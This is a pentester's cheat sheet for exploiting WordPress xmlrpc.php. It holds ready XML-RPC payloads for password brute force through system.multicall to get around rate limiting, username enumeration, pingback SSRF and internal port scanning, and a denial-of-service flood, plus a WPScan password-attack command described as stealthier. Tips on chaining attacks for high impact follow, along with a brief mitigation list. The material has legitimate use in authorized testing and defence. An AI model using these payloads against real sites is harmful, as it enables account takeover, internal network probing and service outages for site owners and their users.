=============================
📄 XMLRPC.PHP Exploitation
=============================
refer: https://h3llwings.wordpress.com/2019/01/14/exploiting-wordpress-xmlrpc/

1.listing methods:
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>

1. 🛠️ Brute Force via system.multicall
---------------------------------------
- Description: Multiple login attempts in one request to bypass rate limiting.
- Tools: Burp Suite, curl, WPScan
- Payload (XML):
<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param>
      <value>
        <array>
          <data>
            <value>
              <struct>
                <member>
                  <name>methodName</name>
                  <value><string>wp.getUsersBlogs</string></value>
                </member>
                <member>
                  <name>params</name>
                  <value>
                    <array>
                      <data>
                        <value>
                          <array>
                            <data>
                              <value><string>admin</string></value>
                              <value><string>password1</string></value>
                            </data>
                          </array>
                        </value>
                      </data>
                    </array>
                  </value>
                </member>
              </struct>
            </value>
            <!-- Repeat structure for more password attempts -->
          </data>
        </array>
      </value>
    </param>
  </params>
</methodCall>

2. 👤 User Enumeration via wp.getUsersBlogs
-------------------------------------------
- Description: Detect valid usernames by difference in error messages.
- Payload:
<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>admin</string></value></param>
    <param><value><string>wrongpass</string></value></param>
  </params>
</methodCall>

- Valid usernames get "Incorrect password" error.
- Invalid usernames return "Invalid username" or different error.

3. 🎯 Pingback SSRF & Port Scanning
-----------------------------------
- Description: Abuse pingback.ping to scan internal resources.
- Payload:

<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>http://<YOUR SERVER ></string></value>
</param>
<param>
<value><string>https://www.nordvpn.com</string></value>
</param>
</params>
</methodCall>

<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://127.0.0.1:22</string></value></param>
    <param><value><string>http://target.com/post</string></value></param>
  </params>
</methodCall>


There are 2 thins to be filled here
1) The link of your server
2) link of some valid post from the wordpress site which is used to call the ping back
- Loop through ports/IPs to scan internal network.
- Response varies based on target reachability.

4. 💣 DoS via Multicall Flood
-----------------------------
- Description: Overload server using tons of calls.
- Payload: system.multicall with hundreds of fake methods.
- Tools: curl, custom scripts
- Warning: May crash server. Use only on authorized tests.

5. 🔑 Credential Stuffing via WPScan
------------------------------------
- Command:
  wpscan --url http://target.com --usernames admin --password-attack xmlrpc --passwords passlist.txt

- Notes: Uses xmlrpc.php for login attempts (faster and stealthier).

=============================
🛡️ Mitigation to Recommend
=============================

- Disable `xmlrpc.php` if unused.
- Block access via `.htaccess` or WAF.
- Install security plugins (e.g., Wordfence).
- Rate-limit requests, especially to XML-RPC.

=============================
✅ Bonus Tips
=============================

- Use Burp Intruder or custom Python scripts for automation.
- Chain with SSRF or DoS for high impact.
- If xmlrpc.php is wide open, often leads to **critical** bugs.

